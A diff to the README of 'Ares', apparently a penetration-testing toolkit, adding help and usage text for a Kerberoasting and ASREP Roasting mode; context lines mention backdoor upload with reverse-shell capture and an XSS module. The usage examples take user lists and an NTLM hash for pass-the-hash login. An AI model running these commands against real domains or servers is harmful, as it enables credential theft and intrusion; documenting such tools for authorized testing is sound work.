@@ -71,8 +71,31 @@ Ares uploads a backdoor file, & can automatically trigger it to catch a reverse 
 	ares -m upload -u http://10.10.40.117/panel/ -n fileUpload -b
 ```
 
-### Roasting
+### Roaster
 Perform ASREP Roasting & Kerberoasting.
+
+```
+[Options]
+	-h: Display this help message
+	-i <IP_ADDRESS>: The Domain Controller's IP Address
+	-x <MODE>: Select the operation to perform
+	-d <DOMAIN.TLD>: The full domain name (e.g., xample.local)
+
+	-u <USERNAME>: The user to authenticate as
+	-U <USER_LIST>: File path for a list of usernames
+
+	-p <PASSWORD>: The password to use for authentication
+        -n <NTLM>: Authenticate using the specified NTLM hash, instead of a password
+
+
+[Modes]
+	asrep: Perform ASREP Roasting
+	krb: Perform Kerberoasting
+
+[Usage]
+	ares -m roast -x asrep -i 123.45.67.890 -d xample.local -U /tmp/users.txt
+	ares -m roast -x krb -i 123.45.67.890 -d xample.local -u bob -n 8846F7EAEE8FB117AD06BDD830B7586C
+```
 
 ### XSS
 Ensure that your account has the privileges needed to listen on the port you specified for the Flask server.
